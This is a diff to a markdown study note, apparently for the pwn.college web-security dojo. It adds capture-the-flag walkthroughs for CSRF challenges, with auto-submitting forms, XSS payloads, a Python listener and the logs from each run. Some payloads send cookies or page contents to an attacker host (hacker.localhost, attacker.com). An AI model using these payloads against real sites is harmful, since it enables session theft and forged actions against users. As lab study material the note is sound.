@@ -20,33 +20,15 @@ published: true
 
 This module walks through the fundamentals of client-side web vulnerabilities:
 
-| Topic | What it tests |
-|---|---|
-| **Content Injection** | Injecting unsanitised user input into HTML responses |
-| **Cross-Site Scripting (XSS)** | Executing attacker-controlled JavaScript in a victim's browser |
-| **Cross-Site Request Forgery (CSRF)** | Forging authenticated requests from a victim's session |
-
----
-
-## Content Injection
-
-Content injection happens when user-supplied data is reflected directly into a page without encoding. The browser interprets the injected content as markup, breaking out of the intended context.
-
-### Key Concepts
-
-- **HTML injection** — inject `<b>`, `<img>`, `<a>` tags to alter page appearance or trigger resource loads.
-- **Context matters** — payload shape depends on *where* the reflection lands: inside a tag value, between tags, inside a `<script>` block, or inside a CSS rule.
-
-### Approach
-
-```python
-# Probe with a harmless marker first
-payload = "<b>injected</b>"
-
-# Observe how it lands in the response
-# If rendered as bold text → HTML injection confirmed
-# If escaped to &lt;b&gt; → need a different bypass
-```
+| Topic                                 | What it tests                                                                 |
+| ------------------------------------- | ----------------------------------------------------------------------------- |
+| **Content Injection**                 | Injecting unsanitised user input into HTML responses                          |
+| **Path Traversal**                    | Accessing files outside applications outside of application's intended folder |
+| **Command Injection**                 | Injecting commands into the shell via web inputs                              |
+| **Authentication Bypass**             | Bypassing authentication logic of an application                              |
+| **SQL Injection**                     | Exploiting unsanitised SQL queries                                            |
+| **Cross-Site Scripting (XSS)**        | Executing attacker-controlled JavaScript in a victim's browser                |
+| **Cross-Site Request Forgery (CSRF)** | Forging authenticated requests from a victim's session                        |
 
 ---
 
@@ -60,10 +42,12 @@ The payload travels in the request (URL param, form field) and is immediately ec
 
 ```html
 <!-- Classic reflected probe -->
-<script>alert(document.domain)</script>
+<script>
+  alert(document.domain);
+</script>
 
 <!-- If angle brackets are filtered, try event handlers -->
-"><img src=x onerror=alert(1)>
+"><img src="x" onerror="alert(1)" />
 
 <!-- Inside a JS string context -->
 ';alert(1)//
@@ -83,7 +67,7 @@ The payload is persisted server-side (DB, log, comment field) and served to ever
 ```html
 <!-- Input that gets stored and later reflected to admins -->
 <script>
-  fetch('https://attacker.com/steal?c=' + document.cookie);
+  fetch("https://attacker.com/steal?c=" + document.cookie);
 </script>
 ```
 
@@ -103,37 +87,233 @@ https://victim.com/page#<img src=x onerror=alert(1)>
 
 ## Cross-Site Request Forgery (CSRF)
 
-CSRF abuses the fact that browsers automatically attach cookies to any request matching the cookie's domain/path, regardless of *which* site initiated the request.
+CSRF abuses the fact that browsers automatically attach cookies to any request matching the cookie's domain/path, regardless of _which_ site initiated the request.
 
-### Anatomy of a CSRF Attack
+### CSRF 1 - Publish Flag Post of Admin with CSRF
 
-1. Victim is authenticated to `bank.com`.
-2. Victim visits attacker-controlled `evil.com`.
-3. `evil.com` issues a forged request to `bank.com/transfer` using the victim's session cookie.
-4. The server sees a valid authenticated request and executes it.
+This dojo is blog where users can write posts to publish (`/publish`) or save to drafts (`/draft`). The challenge wants us to publish the flag which is in the admin's draft.
+We would do this by setting up a python server on our machine to host our payload in a .html file and the victim (admin) visits our URL which executes `/publish` to publish the victims drafts, thereby revealing the post containing the flag on the general blog.
 
-### Exploit Skeleton
+#### Exploit Skeleton
+
+`index.html` - hosted on our server `http://hacker.localhost:1337/`
 
 ```html
-<!-- Hosted on evil.com — GET-based action -->
-<img src="https://target.com/action?param=attacker_value">
+<html>
+  <body>
+    <form action="http://challenge.localhost/publish" method="get">
+      Post:<textarea name="content">Tis I admin</textarea>
+      <input type="checkbox" name="publish" value="on" checked />Publish
+      <input type="submit" value="Save" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
 
-<!-- POST-based action (auto-submit form) -->
-<form id="csrf" action="https://target.com/sensitive-action" method="POST" hidden>
-  <input name="amount" value="1000">
-  <input name="to"     value="attacker_account">
-</form>
-<script>document.getElementById('csrf').submit();</script>
+```bash
+hacker@web-security~csrf-1:~$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+```
+
+Then deploy to the victim
+
+```bash
+hacker@web-security~csrf-1:/challenge$ ./victim http://hacker.localhost:1337/index.html
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
+Visiting http://challenge.localhost:80/
+Logging in as admin...
+Logged in!
+Visiting the attacker's website (http://hacker.localhost:1337/)...
+Visited! Go check if the attack worked!
+```
+
+Then at my end, it shows it was visited
+
+```bash
+hacker@web-security~csrf-1:~$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+127.0.0.1 - - [05/Nov/2026 15:22:19] "GET / HTTP/1.1" 200 -
+```
+
+Then I go back to the blog and find out the admins drafts have been published
+
+```text
+Author: admin
+pwn.college{...}
+```
+
+<Callout type="tip" title="HTML naming">
+  - `index.html`: use the default instead of something like `exploit.html`, else
+  it won't work and you'd go down the rabbit whole of why.
+</Callout>
+
+### CSRF 2 - POST
+
+#### Exploit Skeleton
+
+```html
+<html>
+  <body>
+    <form action="http://challenge.localhost/publish" method="post">
+      Post:<textarea name="content">Tis I admin</textarea>
+      <input type="checkbox" name="publish" value="on" checked />Publish
+      <input type="submit" value="Save" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+### CSRF 3 - Trigger a XSS to Invoke `alert(PWNED)`
+
+#### Exploit Skeleton
+
+```html
+<html>
+  <body>
+    <form action="http://challenge.localhost/ephemeral" method="get">
+      <input
+        type="hidden"
+        name="msg"
+        value='</textarea><script>alert("PWNED")</script></textarea>'
+      />
+      <input type="checkbox" name="publish" value="on" checked />Publish
+      <input type="submit" value="Save" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+### CSRF 4 - Leading to a XSS Leading to a Cookie Leak
+
+#### Exploit Skeleton
+
+```html
+<html>
+  <body>
+    <form action="http://challenge.localhost/ephemeral" method="get">
+      <input
+        type="hidden"
+        name="msg"
+        value='</textarea><script>new Image().src="http://hacker.localhost:1337/?c="+encodeURIComponent(document.cookie)</script></textarea>'
+      />
+      <input type="checkbox" name="publish" value="on" checked />Publish
+      <input type="submit" value="Save" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+### CSRF 5 - Read the Page with the Flag using Javascript's `fetch()`
+
+#### Exploit Skeleton
+
+```html
+<html>
+  <body>
+    <form action="http://challenge.localhost/ephemeral" method="get">
+      <input
+        type="hidden"
+        name="msg"
+        value='</textarea><script>fetch("http://challenge.localhost/").then(r=>r.text()).then(h=>fetch("http://hacker.localhost:1337/",{method:"POST",body:h}))</script></textarea>'
+      />
+      <input type="checkbox" name="publish" value="on" checked />Publish
+      <input type="submit" value="Save" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+I had Deepseek build me a listener
+
+`server.py`
+
+```python
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path in ("/", "/index.html"):
+            with open("index.html", "rb") as f:
+                body = f.read()
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(length)
+        print("=== POST BODY ===")
+        print(body.decode("utf-8", "replace"))
+        self.send_response(200)
+        self.end_headers()
+
+HTTPServer(("0.0.0.0", 1337), Handler).serve_forever()
+```
+
+Deploy to victim
+
+```bash
+hacker@web-security~csrf-5:/challenge$ ./victim http://hacker.localhost:1337/index.html
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
+Visiting http://challenge.localhost:80/
+Logging in as admin...
+Logged in!
+Visiting the attacker's website (http://hacker.localhost:1337/)...
+Visited! Go check if the attack worked!
+```
+
+Then on my server, I receive the contents of the page
+
+```bash
+hacker@web-security~csrf-5:~$ python3 server.py
+127.0.0.1 - - [05/Nov/2026 15:50:08] "GET / HTTP/1.1" 200 -
+=== POST BODY ===
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form><hr>
+        <h2>Author: admin</h2><b>YOUR POST:</b> pwn.college{...}<hr>
+</body></html>
+127.0.0.1 - - [05/Nov/2026 15:50:08] "POST / HTTP/1.1" 200
 ```
 
 ### CSRF Defences (and bypasses tested in the module)
 
-| Defence | Bypass |
-|---|---|
-| **CSRF token** (correctly implemented) | No bypass — must leak the token first (via XSS, CORS, referrer) |
-| **SameSite=Lax** cookie | Still vulnerable to top-level navigation (`GET`) requests |
-| **Origin / Referer check** | Spoof with null origin, or chain via open redirect |
-| **Custom request header** (e.g. `X-Requested-With`) | Only effective if CORS blocks the preflight |
+| Defence                                             | Bypass                                                          |
+| --------------------------------------------------- | --------------------------------------------------------------- |
+| **CSRF token** (correctly implemented)              | No bypass — must leak the token first (via XSS, CORS, referrer) |
+| **SameSite=Lax** cookie                             | Still vulnerable to top-level navigation (`GET`) requests       |
+| **Origin / Referer check**                          | Spoof with null origin, or chain via open redirect              |
+| **Custom request header** (e.g. `X-Requested-With`) | Only effective if CORS blocks the preflight                     |
 
 ---
 
